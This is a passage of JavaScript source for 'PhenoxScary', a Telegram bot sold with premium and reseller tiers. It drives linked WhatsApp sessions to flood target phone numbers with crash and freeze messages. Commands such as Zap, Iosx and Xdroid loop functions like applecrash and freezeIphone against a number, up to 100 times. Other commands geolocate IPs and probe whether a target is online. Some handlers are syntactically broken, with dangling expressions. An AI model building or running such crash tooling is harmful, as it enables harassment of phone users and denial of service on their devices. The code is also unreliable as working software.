    ],
  };

  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithVideo(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard,
    });
  }
});

bot.action("bugm", async (ctx) => {
const versi = await getBotVersion();
const sys = getSystemInfo();
  
  const mainMenuMessage = `
<blockquote>Allow Acces !</blockquote>
We Have Successfully Found Your ID,
 Here is the Bug Selection Menu
<blockquote>Author : ›› https://www.ceo/renzzishere</blockquote>
›› Xdroid <Number>
›› Low <Number>
›› Zap <Number>
›› Iosx <Number>

バグを修正する方法を選択してください
Sellect Bug Type >
`;
  const media = {
    type: "video",
    media: getRandomImage(), 
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };

  const keyboard = {
    inline_keyboard: [
      [
        { 
          text: "Back to menu", 
          callback_data: "back",
        }
      ],
    ],
  };

  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithVideo(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard,
    });
  }
});

bot.action("manifest", async (ctx) => {
  
  const mainMenuMessage = `\`\`\`
( Information Pengertian Perintah Script )

1. Fitur Attacking  / PhenoxScary↓↓↓⚙️
• Untuk Menjalankan Serangan
 Ke Target Number Hingga 
 Menyebabkan Crash / Delay / Forceclose

2. Fitur Accpt ↓↓↓⚙️
• Dibuat Untuk Membantu User Menambahkan 
Salah Satu Orderan Baru Yang Membeli 
Script Ini Atau Membantu 
Menambahkan Acces Database!

3. Fitur Accress ↓↓↓⚙️
• Membantu User Menambahkan User
 New Ke Database Reseller, Seperti Juga 
 Menambahkan Partner Tapi Acces Berbeda Beda!

4. Fitur Maintenance ↓↓↓⚙️
• Untuk Membantu User Menghentikan
 System Bot Pada Masa Update Atau Di Perbaiki!. 
 script otomatis Terhenti Semua

5. Fitur Acctoken ↓↓↓ ⚙️
• Membantu User Menambahkan Token Bot
 New Ke Database Tanpa Ribet 
 
6. Fitur Accdb
• Dengan Perintah Ini Anda Dapat Menggunakan Ketika 
Ingin Menambahkan User Owner Tetapi...Ketika Anda 
menggunakan Perintah Ini Kami Akan Selalu Mengecek 
owner Pertama Apakah Id Anda Terdaftar Atau Tidak!
kalo misalnya id anda tidak ditemukan otomatis Kami akan 
menolak permintaan anda!

7. Fitur Tiktok 
• Fitur Ini Dapat Digunakan Untuk Mengunduh/Mendownload Video Tiktok
dari url yang anda berikan ke bot Ini, jadi ketika Anda Mengetik Tiktok <Url>
Bot Otomatis mendownload/Mengunduh Video Yang ada di link video tiktok!

8. Fitur Track IP
• Dapat Mengecek Informasi IP Yang Anda Berikan, Ketika Anda mengetik
Trackip 8.8.8.8 Bot Otomatis Akan Menjalankan Pemeriksaan Data Data
Atau Detail Ip Address Yang Anda Berikan!

9. Fitur Iqc
• Fitur Ini Digunakan Untuk Membuat Foto Sebagai Screenshot Dari iPhone 
contoh Ketika Anda Mengetik Iqc <pesan> <baterai> <operator>
Contoh : Iqc Hello World! 87 Telkomsel Bot Otomatis Akan Memberikan Screenshot 
Hd Atau Screenshot Jernih Dari iPhone!
\`\`\`
© PhenoxScary 🔥
`;

  const media = {
    type: "video",
    media: getRandomImage(), 
    caption: mainMenuMessage,
    parse_mode: "Markdown"
  };

  const keyboard = {
    inline_keyboard: [
      [
        { 
          text: "< Back to menu", 
          callback_data: "back",
        }
      ],
    ],
  };

  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithVideo(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard,
    });
  }
});

bot.action("back", async (ctx) => {
  const sender = ctx.from.username
      ? `@${ctx.from.username}`
  const sys = getSystemInfo();
  const versi = await getBotVersion();
  const userId = ctx.from.id.toString();

  const mainMenuMessage = `
<blockquote>( ! ) Allow Acces</blockquote>
( Description ) : The script was built to help the weak, 
not to help the powerful...
While you are high, don't strengthen the stronger.

ス Author : https://www.ceo/renzishere
ス Version : ${versi}
ス Script : PhenoxScary 
ス Language : JavaScript 
ス User : ${sender}

<blockquote>Please Select Menu to Perform Activities</blockquote>
`;

  const keyboard = {
   inline_keyboard: [
    [
      { 
        text: "PhenoxScary", 
          callback_data: "bugm" 
      }, 
      { 
          text: "Developer Area", 
          callback_data: "dev_menu"
      }
    ],
    [
       { 
            text: "System Information", 
            callback_data: "system_menu" 
       },
       {
           text: "This Owner", 
           url: "t.me/RapzXyzz" 
       }
    ],
  ],
};
  
const media = {
    type: "video",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };

  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard, });
  } catch (err) {
    await ctx.replyWithVideo(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard,
    });
  }
});

//=================================================\\

bot.hears(/^low\b(?:\s+(.*))?$/i, checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id.toString();
  const chatId = ctx.chat.id;
  const sender = ctx.from.username
      ? `@${ctx.from.username}`

  if (!q) return ctx.reply("❗ Contoh:\nLow 628xxxx");

  if (!isActiveUser(ownerUsers, userId)) {
    if (isOnGlobalCooldown()) {
      const remainingTime = Math.ceil((globalCooldown - Date.now()) / 1000);
      return ctx.reply(`⏳ Jeda, tunggu ${remainingTime} detik lagi`);
    }
  }

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  const sentMessage = await ctx.sendPhoto(proccesImg, {
    caption: `\`\`\`
 PhenoxScary\`\`\`
 ›› Attacking ›› wa.me//${q}
 ›› Package ›› Delay Invisible 
 ›› User ›› ${sender}
 ›› ACCES SUCCES ✓
`,
    parse_mode: "Markdown",
  });

  if (!isActiveUser(ownerUsers, userId)) setGlobalCooldown();

  for (let i = 0; i < 2; i++) {
    await DelayMakerInviss(target);
  }
  
  console.log("\x1b[32m[BOT]\x1b[0m PhenoxScary : Send Succesfully ☀️!");
  
    {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
        [{ text: "Owner", url: `t.me/RapzXyzz` }],
      ],
    },
  }
});

bot.hears(/^zap\b(?:\s+(.*))?$/i, checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id.toString();
  const chatId = ctx.chat.id;

  if (!q) return ctx.reply("❗ Contoh:\nZap 628xxxx");

  if (!isActiveUser(ownerUsers, userId)) {
    if (isOnGlobalCooldown()) {
      const remainingTime = Math.ceil((globalCooldown - Date.now()) / 1000);
      return ctx.reply(`⏳ Jeda, tunggu ${remainingTime} detik lagi`);
    }
  }

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  const sentMessage = await ctx.sendPhoto(proccesImg, {
    caption: `\`\`\`
  PhenoxScary\`\`\`
 ›› Attacking ›› wa.me//${q}
 ›› Package ›› Crash Android 
 ›› User ›› ${sender}
 ›› ACCES SUCCES ✓
`,
    parse_mode: "Markdown",
  });
  
  
  if (!isActiveUser(ownerUsers, userId)) setGlobalCooldown();

  for (let i = 0; i < 10; i++) {
    await PhenoxForce(target);
    await CtaZts(target);
    await newImage2(target);
    await sleep(2000);
  }
  
  console.log("\x1b[32m[BOT]\x1b[0m PhenoxScary : Successfully Send ☠️!");
  
    {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
        [{ text: "Owner!", url: `t.me/RapzXyzz` }],
      ],
    },
  }
});
bot.hears(/^iosx\b(?:\s+(.*))?$/i, checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id.toString();
  const chatId = ctx.chat.id;

  if (!q) return ctx.reply("❗ Contoh:\nIosx 628xxxx");

  if (!isActiveUser(ownerUsers, userId)) {
    if (isOnGlobalCooldown()) {
      const remainingTime = Math.ceil((globalCooldown - Date.now()) / 1000);
      return ctx.reply(`⏳ Jeda, tunggu ${remainingTime} detik lagi`);
    }
  }

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  const sentMessage = await ctx.sendPhoto(proccesImg, {
    caption: `\`\`\`
  め | Acces Succesfully ✓\`\`\`
  Package Bug : Crash iPhone Invisible
  Attacking Target : https://wa.me/${q}
  Duration : 4Hours! 
  Status : Proccesing 
  Note : Tolong Di Jeda 5-10 Menit!
`,
    parse_mode: "Markdown",
  });
  
  console.log("\x1b[32m[BOT]\x1b[0m PROSES MENGIRIM BUG");

  if (!isActiveUser(ownerUsers, userId)) setGlobalCooldown();

  for (let i = 0; i < 100; i++) {
    await applecrash(target);
    await freezeIphone(target);
  }
  
  console.log("\x1b[32m[BOT]\x1b[0m BUG BERHASIL DIKIRIM!");

  await ctx.editMessageCaption(
    `\`\`\`
  め | Acces Succesfully ✓\`\`\`
  Package Bug : Crash iPhone Invisible
  Attacking Target : https://wa.me/${q}
  Duration : 4Hours! 
  Status : Succesfully 
  Note : Tolong Di Jeda 5-10 Menit!

プロセスが完了するとターゲッ
トは1にチェックマークを付けます 
`,
    {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "Hubungi Target", url: `https://wa.me/${q}` }],
        ],
      },
    }
  );
});

bot.hears(/^xdroid\b(?:\s+(.*))?$/i, checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id.toString();
  const chatId = ctx.chat.id;

  if (!q) return ctx.reply("❗ Contoh:\nXdroid 628xxxx");

  if (!isActiveUser(ownerUsers, userId)) {
    if (isOnGlobalCooldown()) {
      const remainingTime = Math.ceil((globalCooldown - Date.now()) / 1000);
      return ctx.reply(`⏳ Jeda, tunggu ${remainingTime} detik lagi`);
    }
  }

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  const sentMessage = await ctx.sendPhoto(proccesImg, {
    caption: `\`\`\`
  め | Acces Succesfully ✓\`\`\`
  Package Bug : Blank System
  Attacking Target : https://wa.me/${q}
  Duration : 5Hours! 
  Status : Proccesing 
  Note : Tolong Di Jeda 5-10 Menit!
`,
    parse_mode: "Markdown",
  });
  
  console.log("\x1b[32m[BOT]\x1b[0m PROSES MENGIRIM BUG");

  if (!isActiveUser(ownerUsers, userId)) setGlobalCooldown();

  for (let i = 0; i < 45; i++) {
    await newImage2(target);
    await VlstrCallUiCrash(target);
    await sleep(1000);
    await await PhenoxDrain(target);
    await sleep(1000);
  }
  
  console.log("\x1b[32m[BOT]\x1b[0m BUG BERHASIL DIKIRIM!");

  await ctx.editMessageCaption(
    `\`\`\`
  め | Acces Succesfully ✓\`\`\`
  Package Bug : Blank System
  Attacking Target : https://wa.me/${q}
  Duration : 24Hours! 
  Status : Succesfully 
  Note : Tolong Di Jeda 5-10 Menit!
  
プロセスが完了するとターゲッ
トは1にチェックマークを付けます 
`,
    {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "「 𝘾𝙝𝙚𝙘𝙠 𝙏𝙖𝙧𝙜𝙚𝙩 」", url: `https://wa.me/${q}` }],
        ],
      },
    }
  );
});

bot.hears(/^phnxbeta\b(?:\s+(.*))?$/i, checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id.toString();
  const chatId = ctx.chat.id;

  if (!q) return ctx.reply("❗ Contoh:\nPhnxbeta 628xxxx");

  if (!isActiveUser(ownerUsers, userId)) {
    if (isOnGlobalCooldown()) {
      const remainingTime = Math.ceil((globalCooldown - Date.now()) / 1000);
      return ctx.reply(`⏳ Jeda, tunggu ${remainingTime} detik lagi`);
    }
  }

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  const sentMessage = await ctx.sendPhoto(proccesImg, {
    caption: `\`\`\`
  め | Acces Succesfully ✓\`\`\`
  Package Bug : Delay Beta
  Attacking Target : https://wa.me/${q}
  Duration : 5Hours! 
  Status : Proccesing 
  Note : Tolong Di Jeda 5-10 Menit!
`,
    parse_mode: "Markdown",
  });
  
  console.log("\x1b[32m[BOT]\x1b[0m PROSES MENGIRIM BUG");

  if (!isActiveUser(ownerUsers, userId)) setGlobalCooldown();

  for (let i = 0; i < 2; i++) {
    await DelayBeta(target);
    await DelayBeta(target);
    await sleep(1000);
    await DelayBeta(target);
    await sleep(1000);
  }
  
  console.log("\x1b[32m[BOT]\x1b[0m BUG BERHASIL DIKIRIM!");

  await ctx.editMessageCaption(
    `\`\`\`
  め | Acces Succesfully ✓\`\`\`
  Package Bug : Delay Beta
  Attacking Target : https://wa.me/${q}
  Duration : 24Hours! 
  Status : Succesfully 
  Note : Tolong Di Jeda 5-10 Menit!
  
プロセスが完了するとターゲッ
トは1にチェックマークを付けます 
`,
    {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "「 𝘾𝙝𝙚𝙘𝙠 𝙏𝙖𝙧𝙜𝙚𝙩 」", url: `https://wa.me/${q}` }],
        ],
      },
    }
  );
});

//=================================================\\
bot.hears(/^cekidch\b(?:\s+(.*))?$/i, async (ctx) => {
  const args = ctx.message.text.split(" ");
  
  // Cek input
  if (args.length < 2) return ctx.reply("❌ Format salah! Cekidch <link_channel>");
  
  const link = args[1];

  // Validasi link channel WA
  if (!link.includes("https://whatsapp.com/channel/")) {
    return ctx.reply("❌ Link channel tidak valid!");
  }

  try {
    // Ambil kode undangan dari link
    const inviteCode = link.split("https://whatsapp.com/channel/")[1];

    // Ambil metadata channel WA via Baileys
    const res = await zenxy.newsletterMetadata("invite", inviteCode);

    // Format teks hasil
    const teks = `
📡 *Data Channel WhatsApp*
━━━━━━━━━━━━━━━━━━
🆔 *ID:* ${res.id}
📛 *Nama:* ${res.name}
👥 *Total Pengikut:* ${res.subscribers}
📊 *Status:* ${res.state}
✅ *Verified:* ${res.verification === "VERIFIED" ? "Terverifikasi" : "Belum Verif"}
`;

    // Kirim balasan ke Telegram
    await ctx.reply(teks, { parse_mode: "Markdown" });

  } catch (err) {
    console.error(err);
    ctx.reply("❌ Gagal mengambil data channel. Pastikan link benar dan WA bot online.");
  }
});
bot.hears(/^lapor\b(?:\s+(.*))?$/i, async (ctx) => {
  try {
    const message = ctx.message.text.split(' ').slice(1).join(' ');
    const sender = ctx.from.username
      ? `@${ctx.from.username}`
      : ctx.from.first_name || 'Pengguna';

    if (!message)
      return ctx.reply('💬 Kirim laporan ke owner dengan format:\nLapor <pesan kamu>');

    // Kirim ke owner
    await ctx.telegram.sendMessage(
      OWNER_ID,
      `📩 Pesan baru dari ${sender} (ID: ${ctx.from.id}):\n\n${message}`
    );

    ctx.reply('✅ Laporan kamu sudah dikirim ke owner.');
  } catch (err) {
    console.error(err);
    ctx.reply('❌ Gagal mengirim laporan ke owner.');
  }
});
bot.hears(/^cekip\b(?:\s+(.*))?$/i, async (ctx) => {
  try {
    const input = ctx.message.text.split(' ')[1];
    if (!input) return ctx.reply('⚠️ Masukkan domain!\nContoh: Cekip google.com');

    ctx.reply('Waiting For Proccesing...');

    dns.lookup(input, (err, address) => {
      if (err) {
        ctx.reply(`❌ Gagal menemukan IP untuk domain: ${input}\nError: ${err.message}`);
      } else {
        ctx.reply(`✅ IP dari domain *${input}* adalah:\n\n🌐 ${address}`, { parse_mode: 'Markdown' });
      }
    });
  } catch (e) {
    console.error(e);
    ctx.reply('❌ Terjadi kesalahan saat memproses permintaan.');
  }
});

bot.hears(/^addcreds\b(?:\s+(.*))?$/i, async (ctx) => {
  try {
    const args = ctx.message.text.split(" ");
    const tagFile = args[1];

    if (!tagFile) {
      return ctx.reply("⚠️ Format salah.\nGunakan: Addcreds <tag_file> (reply ke file creds.json)");
    }

    if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.document) {
      return ctx.reply("⚠️ Harap reply ke file creds.json dengan command ini.");
    }

    const fileId = ctx.message.reply_to_message.document.file_id;
    const fileLink = await ctx.telegram.getFileLink(fileId);

    const deviceDir = path.join(SESSIONS_DIR, tagFile);
    if (!fs.existsSync(deviceDir)) fs.mkdirSync(deviceDir, { recursive: true });

    const credsPath = path.join(deviceDir, "creds.json");

    const res = await fetch(fileLink.href);
    const buffer = Buffer.from(await res.arrayBuffer());
    fs.writeFileSync(credsPath, buffer);

    await ctx.reply(`✅ Creds berhasil disimpan di:\n${credsPath}`);

    
    await connectWhatsApp(tagFile, credsPath, ctx);
  } catch (err) {
    console.error(err);
    ctx.reply("❌ Terjadi kesalahan saat menambahkan addsender.");
  }
});

bot.hears(/^listsender\b(?:\s+(.*))?$/i, async (ctx) => {
  const devices = fs.readdirSync(SESSIONS_DIR).filter((dir) => {
    return fs.existsSync(path.join(SESSIONS_DIR, dir, "creds.json"));
  });

  if (devices.length === 0) {
    return ctx.reply("📂 Tidak ada sender tersimpan.");
  }

  let replyMsg = "📑 Daftar Sender:\n";

  for (const tagFile of devices) {
    const credsPath = path.join(SESSIONS_DIR, tagFile, "creds.json");

    try {
      const { state, saveState } = useSingleFileAuthState(credsPath);
      const sock = makeWASocket({ auth: state, printQRInTerminal: false });

      sock.ev.on("creds.update", saveState);

      await new Promise((resolve) => {
        sock.ev.on("connection.update", (update) => {
          const { connection } = update;

          if (connection === "open") {
            const me = sock.user || {};
            replyMsg += `\n✅ ${tagFile}\n- ID: ${me.id}\n- Nama: ${me.name}`;
            sock.end();
            resolve();
          } else if (connection === "close") {
            replyMsg += `\n❌ ${tagFile} (expired / invalid)`;
            resolve();
          }
        });
      });
    } catch (err) {
      console.error(err);
      replyMsg += `\n⚠️ ${tagFile} (gagal dibaca)`;
    }
  }

  ctx.reply(replyMsg);
});

bot.hears(/^trackip\b(?:\s+(.*))?$/i, checkPremium, async (ctx) => {
  const args = ctx.message.text.split(" ").filter(Boolean);
  if (!args[1]) return ctx.reply("›› Format: Trackip 8.8.8.8");

  const ip = args[1].trim();

  function isValidIPv4(ip) {
    const parts = ip.split(".");
    if (parts.length !== 4) return false;
    return parts.every(p => {
      if (!/^\d{1,3}$/.test(p)) return false;
      if (p.length > 1 && p.startsWith("0")) return false; // hindari "01"
      const n = Number(p);
      return n >= 0 && n <= 255;
    });
  }

  function isValidIPv6(ip) {
    const ipv6Regex = /^(([0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}|(::)|(::[0-9a-fA-F]{1,4})|([0-9a-fA-F]{1,4}::[0-9a-fA-F]{0,4})|([0-9a-fA-F]{1,4}(:[0-9a-fA-F]{1,4}){0,6}::([0-9a-fA-F]{1,4}){0,6}))$/;
    return ipv6Regex.test(ip);
  }

  if (!isValidIPv4(ip) && !isValidIPv6(ip)) {
    return ctx.reply("❌ ☇ IP tidak valid masukkan IPv4 (contoh: 8.8.8.8) atau IPv6 yang benar");
  }

  let processingMsg = null;
  try {
  processingMsg = await ctx.reply(`🔎 ☇ Tracking IP ${ip} — sedang memproses`, {
    parse_mode: "HTML"
  });
} catch (e) {
    processingMsg = await ctx.reply(`🔎 ☇ Tracking IP ${ip} — sedang memproses`);
  }

  try {
    const res = await axios.get(`https://ipwhois.app/json/${encodeURIComponent(ip)}`, { timeout: 10000 });
    const data = res.data;

    if (!data || data.success === false) {
      return await ctx.reply(`❌ ☇ Gagal mendapatkan data untuk IP: ${ip}`);
    }

    const lat = data.latitude || "";
    const lon = data.longitude || "";
    const mapsUrl = lat && lon ? `https://www.google.com/maps/search/?api=1&query=${encodeURIComponent(lat + ',' + lon)}` : null;

    const caption = `
<blockquote><pre>⬡═―—⊱ ⎧ 𝐗 - 𝐙𝐄𝐍𝐙𝐎 ⎭ ⊰―—═⬡</pre></blockquote>
⌑ IP: ${data.ip || "-"}
⌑ Country: ${data.country || "-"} ${data.country_code ? `(${data.country_code})` : ""}
⌑ Region: ${data.region || "-"}
⌑ City: ${data.city || "-"}
⌑ ZIP: ${data.postal || "-"}
⌑ Timezone: ${data.timezone_gmt || "-"}
⌑ ISP: ${data.isp || "-"}
⌑ Org: ${data.org || "-"}
⌑ ASN: ${data.asn || "-"}
⌑ Lat/Lon: ${lat || "-"}, ${lon || "-"}
`.trim();

    const inlineKeyboard = mapsUrl ? {
      reply_markup: {
        inline_keyboard: [
          [{ text: "⌜🌍⌟ ☇ オープンロケーション", url: mapsUrl }]
        ]
      }
    } : null;

    try {
      if (processingMsg && processingMsg.photo && typeof processingMsg.message_id !== "undefined") {
        await ctx.telegram.editMessageCaption(
          processingMsg.chat.id,
          processingMsg.message_id,
          undefined,
          caption,
          { parse_mode: "HTML", ...(inlineKeyboard ? inlineKeyboard : {}) }
        );
      } else if (typeof thumbnailUrl !== "undefined" && thumbnailUrl) {
        await ctx.replyWithPhoto(thumbnailUrl, {
          caption,
          parse_mode: "HTML",
          ...(inlineKeyboard ? inlineKeyboard : {})
        });
      } else {
        if (inlineKeyboard) {
          await ctx.reply(caption, { parse_mode: "HTML", ...inlineKeyboard });
        } else {
          await ctx.reply(caption, { parse_mode: "HTML" });
        }
      }
    } catch (e) {
      if (mapsUrl) {
        await ctx.reply(caption + `📍 ☇ Maps: ${mapsUrl}`, { parse_mode: "HTML" });
      } else {
        await ctx.reply(caption, { parse_mode: "HTML" });
      }
    }

  } catch (err) {
    await ctx.reply("❌ ☇ Terjadi kesalahan saat mengambil data IP (timeout atau API tidak merespon). Coba lagi nanti");
  }
});

bot.hears(/^tiktok\b(?:\s+(.*))?$/i, checkPremium, async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1).join(" ").trim();
  if (!args) return ctx.reply("›› Format: Tiktok https://vt.tiktok.com/ZSUeF1CqC/");

  let url = args;
  if (ctx.message.entities) {
    for (const e of ctx.message.entities) {
      if (e.type === "url") {
        url = ctx.message.text.substr(e.offset, e.length);
        break;
      }
    }
  }

  const wait = await ctx.reply("Waiting For Proccesing...");

  try {
    const { data } = await axios.get("https://tikwm.com/api/", {
      params: { url },
      headers: {
        "user-agent":
          "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/123 Safari/537.36",
        "accept": "application/json,text/plain,*/*",
        "referer": "https://tikwm.com/"
      },
      timeout: 20000
    });

    if (!data || data.code !== 0 || !data.data)
      return ctx.reply("❌ ☇ Gagal ambil data video pastikan link valid");

    const d = data.data;

    if (Array.isArray(d.images) && d.images.length) {
      const imgs = d.images.slice(0, 10);
      const media = await Promise.all(
        imgs.map(async (img) => {
          const res = await axios.get(img, { responseType: "arraybuffer" });
          return {
            type: "photo",
            media: { source: Buffer.from(res.data) }
          };
        })
      );
      await ctx.replyWithMediaGroup(media);
      return;
    }

    const videoUrl = d.play || d.hdplay || d.wmplay;
    if (!videoUrl) return ctx.reply("❌ ☇ Tidak ada link video yang bisa diunduh");

    const video = await axios.get(videoUrl, {
      responseType: "arraybuffer",
      headers: {
        "user-agent":
          "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/123 Safari/537.36"
      },
      timeout: 30000
    });

    await ctx.replyWithVideo(
      { source: Buffer.from(video.data), filename: `${d.id || Date.now()}.mp4` },
      { supports_streaming: true }
    );
  } catch (e) {
    const err =
      e?.response?.status
        ? `❌ ☇ Error ${e.response.status} saat mengunduh video`
        : "❌ ☇ Gagal mengunduh, koneksi lambat atau link salah";
    await ctx.reply(err);
  } finally {
    try {
      await ctx.deleteMessage(wait.message_id);
    } catch {}
  }
});

bot.hears(/^cek\b(?:\s+(.*))?$/i, checkWhatsAppConnection, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply("❗ Contoh:\nCek 628xxxxxxxxx");

  const nomor = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  const idPesan = crypto.randomBytes(8).toString("hex");

  try {
    const sent = await sock.sendMessage(nomor, {
      text: "Cek status...",
    }, { messageId: idPesan });

    let status = sent?.status;
    let info = "";

    if (status === 1) {
      info = "✅ *Centang 1* (Target sedang offline)";
    } else if (status === 2) {
      info = "✅ *Centang 2* (Target sedang online)";
    } else {
      info = "❌ Gagal cek status (mungkin nomor tidak aktif atau diblokir)";
    }

    await ctx.reply(`🔍 *Hasil Pengecekan WhatsApp:*\n• Nomor: ${q}\n• Status: ${info}`, {
      parse_mode: "Markdown"
    });

  } catch (err) {
    console.error("❌ Gagal mengirim pesan cek:", err);
    ctx.reply("❌ Gagal mengecek status, pastikan nomor valid dan terhubung ke WhatsApp.");
  }
});

bot.hears(/^grouponly\b(?:\s+(.*))?$/i, (ctx) => {
  const senderId = ctx.from.id.toString();

  if (!isValidOwner(senderId)) return;

  const arg = ctx.message.text.split(" ")[1];
  if (!["on", "off"].includes(arg)) {
    return ctx.reply("❗ Gunakan:\nGrouponly on\nGrouponly off");
  }

  const status = arg === "on";
  saveGroupConfig({ isGroupOnly: status });
  ctx.reply(`✅ Mode Grouponly sekarang: ${status ? "Aktif ✅" : "Nonaktif ❌"}`);
});

bot.hears(/^setcd\b(?:\s+(.*))?$/i, checkOwner, async (ctx) => {
  const args = ctx.message.text.split(" ");
  const duration = args[1]?.trim();

  if (!duration) {
    return ctx.reply("❗ Contoh penggunaan:\n/setjeda 60s\nSetcd 2m");
  }

  const seconds = parseCooldownDuration(duration); 
  if (seconds === null) {
    return ctx.reply(
      "❌ Format durasi tidak valid.\nGunakan:\nSetcd <durasi>\nContoh:\nSetcd 60s (60 detik)\nSetcd 10m (10 menit)"
    );
  }

  const cooldownData = loadCooldownData(); 
  cooldownData.defaultCooldown = seconds;
  saveCooldownData(cooldownData);

  const displayTime = seconds >= 60
    ? `${Math.floor(seconds / 60)} menit`
    : `${seconds} detik`;

  await ctx.reply(`✅ Cooldown global berhasil diatur ke ${displayTime}`);
});

bot.command("broadcast", async (ctx) => {
  const senderId = ctx.from.id.toString();
  const dbFile = "./DatabaseUser/userlist.json";

  if (senderId !== "8488114208") return;

  const replyMsg = ctx.message.reply_to_message;
  if (!replyMsg) return ctx.reply("❗ Balas pesan yang ingin kamu broadcast.");

  let db = { private: [], group: [] };
  try {
    db = JSON.parse(fs.readFileSync(dbFile));
  } catch (e) {
    return ctx.reply("❌ Gagal membaca data user.");
  }

  const users = db.private || [];
  const groups = db.group || [];
  const allReceivers = [...users, ...groups];

  let successCount = 0;
  let failedCount = 0;

  for (const id of allReceivers) {
    try {
      await ctx.telegram.forwardMessage(id, ctx.chat.id, replyMsg.message_id);
      successCount++;
    } catch (err) {
      failedCount++;
      console.log(`❌ Gagal kirim ke ${id}:`, err.description);
    }
  }

  const info = `✅ Broadcast selesai.

📩 Total User: ${users.length}
👥 Total Grup: ${groups.length}
📬 Terkirim: ${successCount}
❌ Gagal: ${failedCount}`;

  await ctx.reply(info);
});

bot.command("cekdomain", async (ctx) => {
  const args = ctx.message.text.split(" ")[1];
  if (!args) return ctx.reply("⚠️ Contoh: /cekdomain google.com");

  try {
    const res = await axios.get(`https://api.api-ninjas.com/v1/whois?domain=${args}`, {
      headers: { "X-Api-Key": config.apiNinjasKey }
    });

    const msg = `🌐 *Info Domain:*\n\n` +
                `• Domain: ${args}\n` +
                `• Registrar: ${res.data.registrar}\n` +
                `• Dibuat: ${res.data.creation_date}\n` +
                `• Expired: ${res.data.expiration_date}\n` +
                `• DNS: ${res.data.name_servers.join(", ")}`;

    ctx.reply(msg, { parse_mode: "Markdown" });
  } catch (e) {
    ctx.reply("❌ Gagal cek domain (pastikan APIKEY api- sudah benar)");
  }
});

bot.hears(/^Maintenance\b(?:\s+(.*))?$/i, async (ctx) => {
  const userId = ctx.from.id.toString();
  if (userId !== BOT_OWNER_ID) return;

  const args = ctx.message.text.split(" ");
  const status = args[1];

  if (!["on", "off"].includes(status)) {
    return ctx.reply("❗ Contoh:\nMaintenance on bot sedang diperbarui\n/setmaintenance off");
  }

  const message = status === "on"
    ? args.slice(2).join(" ") || "⚠️ Bot sedang dalam maintenance. Silakan coba lagi nanti."
    : "";

  const success = await setMaintenanceStatus(status, message);

  if (success) {
    ctx.reply(`✅ Mode maintenance: *${status.toUpperCase()}*\n${message}`, { parse_mode: "Markdown" });
  } else {
    ctx.reply("❌ Gagal update maintenance.");
  }
});

bot.hears(/^cekid\b(?:\s+(.*))?$/i, async (ctx) => {
    const reply = ctx.message.reply_to_message;

    // Cek apakah ada reply
    if (reply) {
      const user = reply.from;
      const id = `\`${user.id}\``;
      const username = user.username ? `@${user.username}` : "(tidak ada username)";
      return ctx.reply(`ID: ${id}\nUsername: ${username}`, { parse_mode: "Markdown" });
    }

    // Jika tidak ada reply, ambil dari pengirim command
    const user = ctx.message.from;
    const id = `\`${user.id}\``;
    const username = user.username ? `@${user.username}` : "(tidak ada username)";
    return ctx.reply(`ID: ${id}\nUsername: ${username}`, { parse_mode: "Markdown" });
  });

bot.command('Gpt', async (ctx) => {
    const text = ctx.message.text.split(' ').slice(1).join(' '); // Ambil teks setelah `/gpt4`

    if (!text) {
        return ctx.reply("Hai, apa yang ingin saya bantu? Ketik `/Gpt <pertanyaan>`.");
    }

    try {
        const response = await openaiChat(text);
        ctx.reply(response);
    } catch (error) {
        ctx.reply("Maaf, terjadi kesalahan saat memproses permintaan.");
    }
});

bot.command('gpt', async (ctx) => {
    const text = ctx.message.text.split(' ').slice(1).join(' ');
    if (!text) return ctx.reply('Penggunaan: /gpt <teks>');

    try {
      const res = await fetch(`https://fastrestapis.fasturl.cloud/aillm/gpt-4o-turbo?ask=${encodeURIComponent(text)}`);
      const json = await res.json();

      if (!json || !json.result) {
        return ctx.reply('Gagal mendapatkan balasan dari AI.');
      }

